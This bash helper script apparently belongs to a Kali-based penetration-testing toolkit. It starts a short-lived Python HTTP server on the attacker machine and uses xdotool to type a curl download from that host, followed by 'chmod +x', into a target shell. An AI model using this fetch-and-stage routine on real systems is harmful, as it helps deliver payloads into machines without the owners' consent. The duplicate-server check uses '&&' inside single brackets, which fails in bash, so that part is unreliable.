#!/bin/bash

# Declare HTTP_PID as a global variable
HTTP_PID=""
HTTP_PORT=""
HTTP_LOCATION=""

start_python_server() {
    local location="${1}"
    local python_port="${2}"
    local time_to_life="${3:-60}"

    # Check for required arguments
    if [ -z "${python_port}" ] || [ -z "${location}" ]; then
        paste_command 'Usage: start_python_server "location" "python http port" "TTL time; 0 = forever"'
        exit 1
    fi

    # Expand ~ to the full path manually
    location="${location/#\~/$HOME}"

    # check if we already got a server running with the same port and location
    if [ "${HTTP_PID}" != "" && "${HTTP_PORT}" == "${python_port}" && "${HTTP_LOCATION}" == "${location}" ]; then
        if ps -p $HTTP_PID > /dev/null
        then
            return
        fi
    fi

    HTTP_PORT="${python_port}"
    HTTP_LOCATION="${location}"

    # Change directory to the given location
    cd "${location}"

    # Start the Python HTTP server in the background
    python3 -m http.server ${python_port} &
    HTTP_PID=$!

    if [ "${time_to_life}" != "0" ]; then
        # Wait for the TTL time and then kill the server
        sleep ${time_to_life} && kill ${HTTP_PID} &
    fi
}

curl_download() {
    local url="$1"
    local location="$2"

    if [[ -z "$1" ||  -z "$2" ]]; then
        paste_command 'Usage: webclient_download "url" "location"'
        exit 1
    fi

    paste_command "curl ${url} -o ${location}"
    xdotool key Return
    sleep 3

    paste_command "chmod +x ${location}"
    xdotool key Return
    sleep 0.8
}

FILE_LOCATION=""
curl_upload_file() {
    local location="${1}"
    local file="${2}"
    local time_to_life="${3:-60}"

    # Check for required arguments
    if [ -z "${location}" ] || [ -z "${file}" ]; then
        paste_command 'Usage: curl_upload_file "location" "file"'
        exit 1
    fi

    # Generate GUI form items (label, type (optional: default text), name, default (optional))
    PYTHON_HTTP_PORT_FIELD=$(form_item "Python HTTP port" "number" "python_http_port" "1234")
    FILE_LOCATION_FIELD=$(form_item "file location" "file_location" "${file}")
    CREATE_FOLDER_FIELD=$(form_item "create folder location" "select" "create_folder" "no" "yes|no")

    # Generate GUI form
    generate_form "${PYTHON_HTTP_PORT_FIELD}" "${FILE_LOCATION_FIELD}" "${CREATE_FOLDER_FIELD}"

    PYTHON_HTTP_PORT=${form_data["python_http_port"]}
    FILE_LOCATION=${form_data["file_location"]}
    CREATE_FOLDER=${form_data["create_folder"]}

    if [[ "${CREATE_FOLDER}" == "yes" ]]; then
        paste_command "mkdir -p ${FILE_LOCATION}"
        xdotool key Return
        sleep 0.8
    fi

    # start python server: location, python http port, TTL time (default: 60)
    start_python_server "${location}" "${PYTHON_HTTP_PORT}" "${time_to_life}"

    curl_download "http://${KALI_IP}:${PYTHON_HTTP_PORT}/${file}" "${FILE_LOCATION}"
    xdotool key Return
}

show_notify_message () {
    local message="$1"
    local title="${2:-Notification}"
    local icon="${3:-dialog-information}"
    local urgency="${4:-normal}"

    notify-send -u "${urgency}" -i "$icon" "$title" "$message"
}

show_success_notify_message () {
    local message="$1"
    local title="${2:-Success}" 
    local icon="${3:-dialog-ok}"
    local urgency="${4:-normal}"

    show_notify_message "${message}" "${title}" "${icon}" "${urgency}"
}

show_error_notify_message () {
    local message="$1"
    local title="${2:-Error}" 
    local icon="${3:-dialog-error}"
    local urgency="${4:-critical}"

    show_notify_message "${message}" "${title}" "${icon}" "${urgency}"
}
